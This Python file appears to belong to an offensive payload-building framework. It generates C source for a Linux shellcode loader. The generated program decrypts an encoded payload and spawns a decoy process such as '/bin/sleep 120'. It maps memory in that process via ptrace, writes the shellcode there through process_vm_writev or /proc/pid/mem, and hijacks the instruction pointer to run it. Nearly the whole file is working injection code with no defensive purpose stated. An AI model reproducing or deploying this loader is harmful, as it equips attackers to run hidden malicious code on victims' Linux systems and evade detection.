#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for /proc/pid/mem and process_vm_writev injection."""

from __future__ import annotations

from lib.compile.linux_injection_common import LinuxInjectionBuilder


class ProcMemInjectBuilder(LinuxInjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        target_cmd: str = "/bin/sleep 120",
        use_vm_writev: bool = True,
    ) -> str:
        cmd = target_cmd.replace("\\", "\\\\").replace('"', '\\"')
        write_fn = "vm_write_remote" if use_vm_writev else "proc_mem_write_remote"
        return f"""
{chr(10).join(self.headers())}
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

char* enc_payload = "{encoded_payload}";
char* target_cmd = "{cmd}";

{self.ptrace_remote_syscall_helpers()}
static int vm_write_remote(pid_t pid, unsigned long remote_addr,
    const unsigned char *data, size_t len)
{{
    struct iovec local = {{ .iov_base = (void *)data, .iov_len = len }};
    struct iovec remote = {{ .iov_base = (void *)remote_addr, .iov_len = len }};
    ssize_t n = process_vm_writev(pid, &local, 1, &remote, 1, 0);
    return (n == (ssize_t)len) ? 0 : -1;
}}

static int proc_mem_write_remote(pid_t pid, unsigned long remote_addr,
    const unsigned char *data, size_t len)
{{
    char path[64];
    int fd;
    ssize_t n;

    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    fd = open(path, O_RDWR);
    if (fd < 0) return -1;
    if (lseek(fd, (off_t)remote_addr, SEEK_SET) < 0) {{
        close(fd);
        return -1;
    }}
    n = write(fd, data, len);
    close(fd);
    return (n == (ssize_t)len) ? 0 : -1;
}}

static int inject_remote(pid_t pid, unsigned char *sc, size_t len)
{{
    struct user_regs_struct saved, regs;
    unsigned long remote_base;

    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved) < 0)
        goto fail;

    remote_base = remote_mmap_attached(pid, &saved, len);
    if (!remote_base || remote_base >= (unsigned long)-4095UL)
        goto fail;

    if ({write_fn}(pid, remote_base, sc, len) != 0)
        goto fail;

    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
        goto fail;
    regs.rip = remote_base;
    regs.rax = 0;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
        goto fail;
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;

fail:
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return -1;
}}

int main(void)
{{
    pid_t target;
{self.decode_preamble()}
{self.decrypt_block(key, iv)}
    target = spawn_traceable_target(target_cmd);
    if (target < 0) return 1;
    if (wait_until_execed(target) != 0) {{
        kill(target, SIGKILL);
        waitpid(target, NULL, 0);
        munmap(shellcode_buf, (size_t)payload_size);
        free(decoded);
        return 1;
    }}
    if (inject_remote(target, shellcode_buf, (size_t)payload_size) != 0) {{
        kill(target, SIGKILL);
        waitpid(target, NULL, 0);
        munmap(shellcode_buf, (size_t)payload_size);
        free(decoded);
        return 1;
    }}
    waitpid(target, NULL, 0);
{self.cleanup_block()}
    return 0;
}}
"""
